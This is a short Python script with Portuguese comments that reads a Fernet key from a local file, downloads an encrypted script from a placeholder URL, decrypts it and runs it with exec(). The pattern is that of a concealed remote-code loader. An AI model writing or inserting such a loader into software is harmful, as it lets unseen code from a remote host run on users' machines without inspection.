# Executar script externo criptografado
from cryptography.fernet import Fernet
import urllib.request

# Receber chave contida em arquivo chave.key
with open('chave.key', 'rb') as resposta:
    chave = resposta.read()

# Suporte
fernet = Fernet(chave)

# URL do script
url_script = "https://www.exemplo.com/exemplo.py"

# Baixar, ler e decodificar o conteúdo do script externo
with urllib.request.urlopen(url_script) as response:
    script_content = response.read()

# Decriptografar, decodificar e executar
script_decode = fernet.decrypt(script_content).decode()
exec(script_decode)